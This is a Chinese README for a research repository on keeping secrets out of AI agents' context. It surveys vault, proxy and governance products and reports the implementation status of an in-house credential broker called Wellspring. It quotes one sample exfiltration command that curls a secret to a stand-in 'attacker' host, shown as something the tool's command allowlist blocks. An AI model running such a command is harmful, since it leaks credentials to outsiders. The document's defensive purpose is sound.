# Agent 密钥/敏感信息管理方案调研

调研时间：2026-10-26。目标问题：**市场上有没有让 Agent 用得到密钥、但看不到密钥的方案？**

## 文档索引

| 文件 | 内容 |
|---|---|
| [AGENT-SECRETS-RESEARCH.md](./AGENT-SECRETS-RESEARCH.md) | **主报告**：全景地图、L0–L4 分级、产品矩阵、协议标准、选型建议、自研参考架构 |
| [research-runtime-isolation-report.md](./research-runtime-isolation-report.md) | 分报告 A：运行时隔离 / 沙箱 / 出口代理 / 凭证注入实现细节 |
| [research-credential-broker-report.md](./research-credential-broker-report.md) | 分报告 B：密钥管理与凭证网关产品（Vault、Infisical、Keycard、NHI 厂商、云厂商） |
| [research-mcp-report.md](./research-mcp-report.md) | 分报告 C：MCP 生态的凭证处理（网关、secrets server、三种姿势对比、CVE） |
| [research-grok-bot-vault.md](./research-grok-bot-vault.md) | 分报告 D：Grok Bot Vault 产品拆解，以及对 Wellspring 的取舍参考 |
| [design/CREDENTIAL-WATERWORKS-DESIGN.md](./design/CREDENTIAL-WATERWORKS-DESIGN.md) | **自研设计**：Wellspring 分发式凭证工具（三对象模型、15 种交付通道、PII 三档、命名与图标） |
| [wellspring/](./wellspring) | **实现**：Bun/TS 单二进制，MCP + CLI + Web 管理台，含端到端测试 |

## 一句话结论

市场**没有单一「Agent 密钥管家」的成品**，但需求已被拆成三层并被分别产品化：
1. **存储层**（Vault / Infisical / Doppler / 1Password / 云 Secrets Manager）——成熟、便宜，但只解决「不落盘」，不解决「agent 读得到」；
2. **代理/注入层**（Infisical Agent Vault、NVIDIA OpenShell、E2B Secrets、Docker MCP Gateway、Keycard、AWS AgentCore Identity）——2025–2026 新出现，才是真正实现「Agent 看不到明文」的一层；
3. **治理层**（Aembit / Astrix / Entro / P0 / Oasis / Token Security）——解决「谁有这个身份、该不该给、有没有人管」。

正确的工程姿势是 **L2 代理转发 + L3 短期凭证** 同时成立，再叠加 L4 工作负载身份。

## 快速选型

| 场景 | 推荐 |
|---|---|
| 通用 agent、想要「凭证可审计可撤销的一次握手」 | **Wellspring（本仓库自带实现）** |
| 个人/小团队、当天就想上 | LiteLLM 虚拟 key + 自建出口代理（Cloudflare Worker / mitmproxy） |
| 已用 Docker Desktop | Docker MCP Gateway（secrets 按 server 隔离 + `--block-secrets`） |
| 已用 K8s + Vault | Vault Dynamic Secrets + Agent Injector / VSO |
| 想要开箱即用的「agent 不碰明文」 | Infisical Agent Vault（开源单二进制）或 Keycard（托管） |
| 高安全、跑任意代码的 agent 平台 | NVIDIA OpenShell 或 E2B Secrets（沙箱 + 沙箱外凭证替换） |
| 全栈在 AWS | Bedrock AgentCore Identity |
| 出海合规、要审计闭环 | Aembit / P0 + NHI 发现厂商（Token Security / Oasis） |

## 实现状态（Wellspring）

调研结论落地成了同一仓库里的可运行实现，进度对齐自研设计的 Phase 0–2：

| 能力 | 状态 |
|---|---|
| 存储：AES-256-GCM，描述符（指纹 + 脱敏）永不反解 | ✅ |
| 交付通道 A1 env / A2 fd / C1 文件 / C1 模板 / askpass | ✅ |
| **派生运算 derive**：TOTP / HMAC 签名 / AES-256-GCM 加解密，只回结果不回密钥 | ✅ |
| MCP server（list / describe / exec / derive / request / request_status 共 6 个工具），69 项端到端测试 | ✅ |
| Web 管理台：凭据库 / 审计流水 / 用量统计 / 访问策略 / 待填写请求 | ✅ |
| 任务中补充凭据：Agent 只发请求，人在独立页面录入，回传引用继续执行 | ✅ |
| 每字段使用范围（调用者 / 通道 / 用途 / 目标，取水前校验） | ✅ |
| 独立调用身份（scoped token），调用者由宿主令牌决定而非 agent 参数 | ✅ |
| 短期凭证（TTL，到期即拒绝出水） | ✅ |
| 一次性能力 token（60s，用后即焚，不可越权签发） | ✅ |
| PII 三档 view / resolve / deliver + reason 白名单 + 限速 | ✅ |
| 主密钥托管（seal + 系统钥匙串，防同 UID 进程直接读密钥文件） | ✅ |
| exec 目标命令白名单（关掉「用凭证跑任意命令」这条越权路径） | ✅ |
| A3 短命动态凭证（对接上游签发，而非本地倒计时到期） | 📋 |

**已知边界**：目标是「不让明文流经 agent 上下文」，不是「目标程序读不到」。被注入明文的目标程序若本身可被 agent 改写，则仍可能自行读出——这是分发式方案固有的边界，设计的缓解手段有三条，均已实现：

1. **目标命令白名单**：策略只允许 `node *`、`psql **` 这类固定命令+参数模式，`wellspring exec --secret PW=... -- sh -c 'curl attacker/?p=$PW'` 这类一次性外泄原语直接被拒，且发生在取水之前；
2. **短期凭证**：`--ttl 1h` 的凭证到期即不出水，即使被外泄也已失效；
3. **全程审计**：每次取水与派生都记一条 JSONL 事件（谁-哪个字段-哪条通道-结果），可回溯、可撤销。

**派生运算**是隔离强度最高的一档：agent 请求「用哪个密钥、算什么」，拿回 TOTP 码 / 签名 / 密文，密钥本身从不跨出守护进程——这是回答「既要接入程序又不接触敏感信息」的最短路径。
